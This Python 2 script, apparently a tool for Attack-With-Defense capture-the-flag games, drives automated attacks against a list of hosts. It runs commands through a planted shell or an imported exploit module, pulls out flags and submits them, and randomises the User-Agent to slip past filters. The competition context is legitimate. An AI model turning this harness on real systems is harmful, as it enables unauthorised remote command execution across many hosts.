#!/usr/bin/env python

import traceback
from http import http
from config import *
import sys
import time
from flag import *
from function import *
import function
import os
from optparse import OptionParser


def attack(target,target_port,cmd,get_flag):
    global headers
    is_vuln = 1
    flag = "hello world!"
    info = "success"
    reserve = 0    
    if options.random_ua:
	headers['User-Agent'] = random_ua()    

    if check_shell(target,target_port,""):
	dump_success("check_shell success",target+":"+str(target_port),"function.py check_shell")
	res = execute_shell(target,target_port,cmd)
    else:
	dump_warning("check_shell failed",target+":"+str(target_port),"function.py check_shell")
	# Here we use the vulnerability we found in the source code
	res = vulnerable_attack(target,target_port,cmd)
    debug_print(res)
    res = res_filter(res)
    if get_flag:
	if check_flag(res):
	    flag = res
	    dump_info("flag => " + res.replace(" ","").replace("\n",""))
	else:
	    dump_warning("flag format error,you may need to rewrite the shell", target+":"+str(target_port) ,"run.py attack")
    elif "error" in res:
	dump_warning("execution cmd failed",target+":"+str(target_port),"run.py")
    else:
	dump_success("execution cmd",target+":"+str(target_port),"run.py")
    dump_context(res)

    return flag,is_vuln,info,reserve 

def run():
    global raw_cmd,cmd,first_run
    cmd_split_prefix = "/bin/echo %s;"%cmd_prefix
    cmd_split_postfix = ";/bin/echo %s"%cmd_postfix
    
    # if the target list exsists, load it. or regard it as ip addr
    if udf_target:
	targets = udf_target.split(',')
    elif os.path.isfile(target_list):
	targets = open(target_list).readlines()

    for target in targets:
	target = target.strip('\n')
        target,target_port = target.split(":")
	reserve = 0
	is_vuln = 1
	info = "error"
	flag = "hello world!"

	try:
	    # Save the raw cmd
	    if first_run:
		raw_cmd = cmd
                first_run = 0
	    dump_success("**** start attack %s with %s ****"%(target+":"+target_port,raw_cmd))
	    # Use the func in function.py to translate the cmd to real cmd
	    if func:
		cmd = cmd_split_prefix + func(target,target_port,"") + cmd_split_postfix
            else:
                cmd = cmd_split_prefix + raw_cmd + cmd_split_postfix
	    debug_print(cmd)
            flag,is_vuln,info,reserve = attack(target,target_port,cmd,run_for_flag)
	except Exception,e:
	    debug_print(traceback.format_exc())
	    dump_error(str(e),target,load_script)
	
	#set the return value reverse => 0 and is_vuln => 1 and the flag has  been changed, post the flag.
	if not reserve and  is_vuln and flag!="hello world!":
	    res = post_flag(flag)
	    if res:
		dump_success("get flag success",target+":"+str(target_port),"run.py")
	    else:
		dump_error("flag check error",target+":"+str(target_port),"run.py")
	elif is_vuln == 0:
	    dump_error("server not vulnerable",target+":"+str(target_port),"run.py")
	elif reserve==1:
	    dump_error("reverse flag has been set",target+":"+str(target_port),"run.py")
	dump_success("**** finish attack %s with %s ****"%(target+":"+target_port,raw_cmd))
	print ""
	print ""
	print ""
	print ""
    time.sleep(script_runtime_span)
		 
def banner():
    my_banner = ""
    my_banner += "    ___        ______    ___       _       _ \n"
    my_banner += "   / \ \      / /  _ \  |_ _|_ __ | |_ ___| |\n"
    my_banner += "  / _ \ \ /\ / /| | | |  | || '_ \| __/ _ \ |\n"
    my_banner += " / ___ \ V  V / | |_| |  | || | | | ||  __/ |\n"
    my_banner += "/_/   \_\_/\_/  |____/  |___|_| |_|\__\___|_|\n"
    my_banner += "                                             \n"
    my_banner += "                          Hence Zhang@Lancet \n"
    my_banner += "                                             \n"
    print my_banner


if __name__ == '__main__':
    banner()
    parser = OptionParser()
    parser.add_option("-m", "--module",\
                     dest="module", default="sample",\
                      help="Input the attack module here :)")
    
    parser.add_option("-c", "--command",\
                     dest="command", default="get_flag",\
                      help="The command you want to run")
    
    parser.add_option("-r", "--random_ua",\
                     dest="random_ua", default="False",\
                      help="Enable the random UA to avoid filter")
    parser.add_option("-l", "--loop",\
                     dest="loop_count", default="65535",\
                      help="To set the loop count for this program")
    parser.add_option("-t", "--udf_target",\
                     dest="udf_target", default="",\
                      help="To set the target for attacking, split with ,")
    (options, args) = parser.parse_args()
    dump_info("Start the AWD Intel to hack the planet :)")
    load_script = options.module
    cmd = options.command
    loop_count = int(options.loop_count)
    udf_target = options.udf_target
    if options.random_ua:
	dump_info("enable feature random user-agent")
    if cmd=="get_flag" or cmd=="get_flag_2":
	run_for_flag = 1
    vulnerable_attack = __import__(load_script).vulnerable_attack

# if the attack fails, the possible reasons are:
# 1. the server has fixed up that vuln, then add that server to the fail_list
# 2. the server is down, but not fixed, do not add, just skip it this time.
# 3. some other exceptions, just print it out 

    if hasattr(function,cmd):
        func = getattr(function,cmd)
    else:
        func = None

    while loop_count > 0:
        try:
	    run()
        except  KeyboardInterrupt:
	    dump_error("Program stoped by user, existing...")
	    exit()
        dump_info("--------------------- one round finish -----------------------")
	print ""
	loop_count -= 1
    dump_info("finish all tasks, have a nice day :)")
